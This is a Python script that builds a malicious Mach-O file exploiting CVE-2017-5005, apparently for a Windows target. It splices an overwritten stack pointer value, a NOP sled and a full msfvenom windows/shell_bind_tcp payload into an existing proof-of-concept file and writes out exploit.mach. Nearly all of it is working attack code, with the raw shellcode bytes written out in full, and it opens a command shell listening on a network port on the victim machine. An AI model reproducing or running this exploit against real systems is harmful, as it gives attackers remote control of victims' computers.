f = open('CVE-2017-5005.mach', 'rb')
fbytes = f.read()
f.close()

print('Original length: ' + str(len(fbytes))) 

header_n_loads = fbytes[:3184]

load_unixthread = b'\x05\x00\x00\x00\xd8\x04\x00\x00'

thread_state = fbytes[3192:3368]

first3 = fbytes[3368:3504]

first = header_n_loads + load_unixthread + thread_state + b'\x00'*len(first3)
# first = header_n_loads + load_unixthread + thread_state + first3      # Uncomment to avoid NULL load commands after LC_UNIXTHREAD

end = fbytes[3675:]

esp = b'\x7b\x46\x86\x7c'
# esp = b'\x56\x70\x00\x10'         # ESP from original exploit
# esp = b'\xcc\xcc\xcc\xcc'         # Test ESP
t = b'\x00\x00\x00\x74'
h1 = b'\x00\x00\x00\x0c'
h2 = b'\x00\x00\x00\x58'
h3 = b'\x00\x00\x00\x18'

shellcode = fbytes[3524:3675]

exp = esp + t + h1 + h2 + h3 + shellcode

# msfvenom -p windows/shell_bind_tcp EXITFUNC=thread -f python
buf =  b""
buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
buf += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
buf += b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
buf += b"\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
buf += b"\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
buf += b"\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
buf += b"\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
buf += b"\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
buf += b"\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
buf += b"\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
buf += b"\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
buf += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
buf += b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
buf += b"\xff\xd5\x6a\x08\x59\x50\xe2\xfd\x40\x50\x40\x50\x68"
buf += b"\xea\x0f\xdf\xe0\xff\xd5\x97\x68\x02\x00\x11\x5c\x89"
buf += b"\xe6\x6a\x10\x56\x57\x68\xc2\xdb\x37\x67\xff\xd5\x57"
buf += b"\x68\xb7\xe9\x38\xff\xff\xd5\x57\x68\x74\xec\x3b\xe1"
buf += b"\xff\xd5\x57\x97\x68\x75\x6e\x4d\x61\xff\xd5\x68\x63"
buf += b"\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59"
buf += b"\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24"
buf += b"\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e\x56"
buf += b"\x56\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e"
buf += b"\x56\x46\xff\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xe0"
buf += b"\x1d\x2a\x0a\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c"
buf += b"\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00"
buf += b"\x53\xff\xd5"

# mach = first + exp + end              # Uncomment to re-create original PoC
mach = first + esp + b'\x00'*8 + b'\x90'*24 + buf + b'\x00'*(len(exp)-4+len(end)-32-len(buf))

print('Final length: ' + str(len(mach)))

f = open('exploit.mach', 'wb')
f.write(mach)
f.close()